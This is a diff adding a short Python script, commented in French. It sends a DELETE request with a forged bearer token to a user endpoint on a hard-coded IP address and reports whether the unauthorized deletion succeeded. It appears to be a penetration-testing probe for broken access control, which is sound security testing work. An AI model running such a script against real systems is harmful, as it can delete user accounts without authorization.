@@ -1,0 +1,28 @@
+import requests
+
+def unauthorized_request(base_url, target_user_id):
+    """
+    Tente d'exécuter une requête non autorisée pour supprimer un utilisateur.
+    """
+    url = f"{base_url}/api/Users/{target_user_id}"
+    headers = {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer fake_token"  # Exemple d'un token falsifié
+    }
+
+    print(f"[SENDING UNAUTHORIZED DELETE REQUEST] {url}")
+    response = requests.delete(url, headers=headers)
+
+    if response.status_code == 200:
+        print("[SUCCESS] Unauthorized action executed!")
+        print(f"Response: {response.json()}")
+    elif response.status_code == 401:
+        print("[FAILED] Unauthorized - Authentication required (Status: 401)")
+    elif response.status_code == 403:
+        print("[FAILED] Forbidden - Action denied (Status: 403)")
+    else:
+        print(f"[FAILED] Unexpected response (Status: {response.status_code})")
+
+# Test en ciblant un utilisateur
+unauthorized_request("http://45.76.47.218:3000", target_user_id=2)
+
